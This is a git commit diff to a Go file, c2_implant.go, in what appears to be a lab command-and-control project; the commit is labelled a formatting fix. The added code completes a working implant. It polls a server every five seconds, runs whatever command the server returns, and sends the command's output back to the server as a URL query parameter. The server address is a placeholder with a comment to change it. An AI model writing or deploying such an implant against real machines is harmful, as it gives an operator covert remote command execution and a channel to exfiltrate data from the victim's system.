fdf0cae9ffeb18fb76a02990dda16bb427b1e298
datboyblu3 <datboyblu3@protonmail.com>
2026-01-11 13:35:29 -0500

    fix formatting issues

--- containerized-c2-project/implant/c2_implant.go
+++ containerized-c2-project/implant/c2_implant.go
@@ -1,24 +1,29 @@
 package main
 
-import (
-	"io/ioutil"
-	"net/http"
-	"os/exec"
-	"strings"
-	"time"
-)
+	import (
+		"io/ioutil"
+		"net/http"
+		"net/url"
+		"os/exec"
+		"strings"
+		"time"
+	)
 
 func runCommand(command string, args ...string) (string, error) {
-
-
-}
+		cmd := exec.Command(command, args...)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			return "", nil
+		}
+		return string(output), nil
+	}
 
 func main(){
-		baseURL := "http://localhost:9001" //Change the URL to the server to connect to
-	data := ""
+	baseURL := "http://localhost:9001" //Change the URL to the server to connect to
+		data := ""
 
-	for {
-			reqURL := baseURL + "/?data=" + url.WueryEscape(data)
+		for {
+			reqURL := baseURL + "/?data=" + url.QueryEscape(data)
 
 			//Make a GET request to the server with the "data" parameter.
 			resp, err := http.Get(reqURL)
@@ -26,31 +31,30 @@ func main(){
 				continue
 			}
 
-			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			resp.Body.Close()
+			if err != nil {
+				continue
+			}
+
+			//Split the body string into two variables
+			splitValues := strings.Fields(string(body))
+			var command string
+			var args []string
+
+			if len(splitValues) > 0 {
+				command = splitValues[0]
+				if len(splitValues) > 1 {
+					args = splitValues[1:]
+				}
+			}
+
+			data, err = runCommand(command, args...)
+			if err != nil {
+				continue
+			}
+
+			time.Sleep(5 * time.Second)
+		}
 	}
 
-	defer resp.Body.Close()
-
-	body, err:= iout.ReadAll(resp.Body)
-	if err != nil {
-		continue
-	}
-
-	//Split the body string into two variables
-	splitValues := strings.Fields(string(body))
-	var command string
-	var args []string
-
-	if len(splitValues) > 0 {
-		command = splitValues[0]
-		if len(splitValues) > 1 {
-			args = splitValues[1:]
-	}
-
-	data, err = runCommand(command, args...)
-	if err != nil {
-		continue
-	}
-
-	time.Sleep(5 * time.Second)
-}
